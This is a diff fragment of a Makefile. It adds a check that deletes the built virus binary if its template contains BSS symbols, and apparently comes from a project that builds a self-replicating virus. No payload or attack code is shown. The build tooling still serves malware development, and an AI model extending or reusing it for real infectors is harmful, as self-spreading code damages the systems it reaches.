@@ -37,6 +37,7 @@ $(VIRUS_X): $(VIRUS)
 
 $(VIRUS): $(OBJ) $(LD_RULES)
 	ld -o $@ -T $(LD_RULES) $(OBJ)
+	nm -n .tmp/virus.template | grep ' B \| b ' | diff - /dev/null || rm $(VIRUS)
 
 $(TMP_DIR):
 	mkdir -p $@
